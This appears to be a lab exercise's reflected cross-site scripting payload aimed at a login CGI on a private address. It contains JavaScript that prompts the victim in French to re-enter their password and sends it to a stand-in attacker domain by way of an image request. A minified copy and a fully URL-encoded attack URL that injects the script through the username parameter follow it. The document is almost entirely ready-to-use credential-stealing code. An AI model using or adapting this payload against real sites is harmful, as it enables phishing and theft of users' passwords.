var p = prompt("Veuillez entrez a nouveau votre mot de passe");
o = document.createElement('img');
o.setAttribute('src', 'http://www.evil-attacker-website.com/password=' + p);
document.body.appendChild(o);


-- Minified version --
var p=prompt("Veuillez entrez a nouveau votre mot de passe");o=document.createElement('img');o.setAttribute('src','http://www.evil-attacker-website.com/password='+p);document.body.appendChild(o)

-- URL to attack:
http://192.168.99.100/cgi-bin/login.cgi?username=%3Cscript%3Evar%20stolenPassword%20=%20prompt(%22Veuillez%20entrez%20%C3%A0%20nouveau%20votre%20mot%20de%20passe%22);o%20=%20document.createElement(%27img%27);o.setAttribute(%27src%27,%20%27http://www.evil-attacker-website.com/password=%27%20+%20stolenPassword);document.body.appendChild(o);%3C/script%3E&password=foobar
